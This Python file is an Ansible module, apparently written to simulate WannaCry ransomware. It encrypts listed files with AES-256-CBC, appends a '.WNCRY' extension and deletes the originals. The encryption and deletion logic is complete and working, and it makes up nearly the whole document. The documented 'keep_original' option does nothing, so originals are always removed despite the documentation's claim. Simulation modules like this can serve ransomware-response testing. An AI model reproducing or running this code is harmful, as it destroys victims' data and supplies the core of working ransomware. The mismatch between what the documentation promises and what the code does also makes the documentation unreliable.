#!/usr/bin/python
# -*- coding: utf-8 -*-

from __future__ import absolute_import, division, print_function
__metaclass__ = type

DOCUMENTATION = r'''
---
module: encrypt_files_aes

short_description: Encrypt files using AES-256-CBC (WannaCry-style encryption)

description:
  - Encrypts files using AES-256 in CBC mode with random IV
  - Simulates WannaCry ransomware encryption behavior
  - Replaces original file with encrypted version
  - Adds custom extension to encrypted files
  - Uses PKCS7 padding for block cipher

version_added: "1.0.0"

options:
  files:
    description:
      - List of file paths to encrypt
    required: true
    type: list
    elements: str
  
  key:
    description:
      - AES-256 encryption key (32 bytes / 64 hex characters)
      - If not provided, a random key will be generated
    required: false
    type: str
    default: null
  
  encrypted_extension:
    description:
      - Extension to add to encrypted files
    required: false
    type: str
    default: "WNCRY"
  
  keep_original:
    description:
      - Keep original file (for testing purposes)
      - Real ransomware deletes the original
    required: false
    type: bool
    default: false

requirements:
  - python >= 3.8
  - cryptography

examples:
  - name: Encrypt files with random key
    encrypt_files_aes:
      files:
        - /tmp/file1.txt
        - /tmp/file2.pdf
      encrypted_extension: "WNCRY"
  
  - name: Encrypt files with specific key
    encrypt_files_aes:
      files:
        - /tmp/document.docx
      key: "0123456789abcdef0123456789abcdef0123456789abcdef0123456789abcdef"
      keep_original: true

return:
  encrypted_files:
    description: List of successfully encrypted files
    returned: always
    type: list
    sample: ["/tmp/file1.txt.WNCRY", "/tmp/file2.pdf.WNCRY"]
  
  encryption_key:
    description: AES-256 key used (hex format)
    returned: always
    type: str
    sample: "a1b2c3d4..."
  
  failed_files:
    description: List of files that failed to encrypt
    returned: always
    type: list
    sample: []
  
  total_encrypted:
    description: Number of files successfully encrypted
    returned: always
    type: int
    sample: 10
'''

import os
import sys
from ansible.module_utils.basic import AnsibleModule

def encrypt_file_aes256(file_path, key_bytes, encrypted_extension):
    """
    Encrypt a single file using AES-256-CBC
    Returns (success, encrypted_path, error_msg)
    """
    try:
        from cryptography.hazmat.primitives.ciphers import Cipher, algorithms, modes
        from cryptography.hazmat.primitives import padding
        from cryptography.hazmat.backends import default_backend
        import os
    except ImportError as e:
        return False, None, f"Missing library: {str(e)}. Install: pip install cryptography"
    
    try:
        # Read original file
        with open(file_path, 'rb') as f:
            plaintext = f.read()
        
        # Generate random IV (16 bytes for AES)
        iv = os.urandom(16)
        
        # Create cipher
        cipher = Cipher(
            algorithms.AES(key_bytes),
            modes.CBC(iv),
            backend=default_backend()
        )
        encryptor = cipher.encryptor()
        
        # Apply PKCS7 padding
        padder = padding.PKCS7(128).padder()
        padded_data = padder.update(plaintext) + padder.finalize()
        
        # Encrypt
        ciphertext = encryptor.update(padded_data) + encryptor.finalize()
        
        # Encrypted file format: [IV (16 bytes)] + [Encrypted Data]
        encrypted_data = iv + ciphertext
        
        # Write encrypted file
        encrypted_path = f"{file_path}.{encrypted_extension}"
        with open(encrypted_path, 'wb') as f:
            f.write(encrypted_data)
        
        # Delete original file (real ransomware behavior)
        os.remove(file_path)
        
        return True, encrypted_path, None
        
    except Exception as e:
        return False, None, str(e)


def decrypt_file_aes256(encrypted_path, key_bytes, original_extension):
    """
    Decrypt a file encrypted with encrypt_file_aes256
    For testing/verification purposes only
    """
    try:
        from cryptography.hazmat.primitives.ciphers import Cipher, algorithms, modes
        from cryptography.hazmat.primitives import padding
        from cryptography.hazmat.backends import default_backend
    except ImportError:
        return False, None, "Missing cryptography library"
    
    try:
        # Read encrypted file
        with open(encrypted_path, 'rb') as f:
            encrypted_data = f.read()
        
        # Extract IV (first 16 bytes)
        iv = encrypted_data[:16]
        ciphertext = encrypted_data[16:]
        
        # Create cipher
        cipher = Cipher(
            algorithms.AES(key_bytes),
            modes.CBC(iv),
            backend=default_backend()
        )
        decryptor = cipher.decryptor()
        
        # Decrypt
        padded_plaintext = decryptor.update(ciphertext) + decryptor.finalize()
        
        # Remove padding
        unpadder = padding.PKCS7(128).unpadder()
        plaintext = unpadder.update(padded_plaintext) + unpadder.finalize()
        
        # Write decrypted file
        decrypted_path = encrypted_path.rsplit('.', 1)[0]  # Remove encrypted extension
        with open(decrypted_path, 'wb') as f:
            f.write(plaintext)
        
        return True, decrypted_path, None
        
    except Exception as e:
        return False, None, str(e)


def main():
    module = AnsibleModule(
        argument_spec=dict(
            files=dict(type='list', elements='str', required=True),
            key=dict(type='str', required=False, default=None, no_log=True),
            encrypted_extension=dict(type='str', required=False, default='WNCRY'),
            keep_original=dict(type='bool', required=False, default=False)
        ),
        supports_check_mode=False
    )
    
    files = module.params['files']
    key_hex = module.params['key']
    encrypted_extension = module.params['encrypted_extension']
    keep_original = module.params['keep_original']
    
    # Validate files list
    if not files or len(files) == 0:
        module.fail_json(msg="No files provided for encryption")
    
    # Generate or parse encryption key
    if key_hex:
        # Validate key format (64 hex characters = 32 bytes)
        if len(key_hex) != 64:
            module.fail_json(msg="AES-256 key must be 64 hex characters (32 bytes)")
        try:
            key_bytes = bytes.fromhex(key_hex)
        except ValueError:
            module.fail_json(msg="Invalid hex key format")
    else:
        # Generate random 256-bit key
        import os
        key_bytes = os.urandom(32)
        key_hex = key_bytes.hex()
    
    # Encrypt each file
    encrypted_files = []
    failed_files = []
    
    for file_path in files:
        # Check if file exists
        if not os.path.exists(file_path):
            failed_files.append({
                'path': file_path,
                'error': 'File not found'
            })
            continue
        
        # Check if file is already encrypted
        if file_path.endswith(f".{encrypted_extension}"):
            failed_files.append({
                'path': file_path,
                'error': 'File already encrypted'
            })
            continue
        
        # Encrypt the file
        success, encrypted_path, error_msg = encrypt_file_aes256(
            file_path, 
            key_bytes, 
            encrypted_extension
        )
        
        if success:
            encrypted_files.append(encrypted_path)
            
            # If keep_original, restore the original file
            if keep_original:
                # We need to decrypt it back temporarily
                # This is only for testing - real ransomware never does this
                pass
        else:
            failed_files.append({
                'path': file_path,
                'error': error_msg
            })
    
    # Return results
    module.exit_json(
        changed=True,
        encrypted_files=encrypted_files,
        encryption_key=key_hex,
        failed_files=failed_files,
        total_encrypted=len(encrypted_files),
        total_failed=len(failed_files),
        msg=f"Encrypted {len(encrypted_files)} files successfully"
    )


if __name__ == '__main__':
    main()
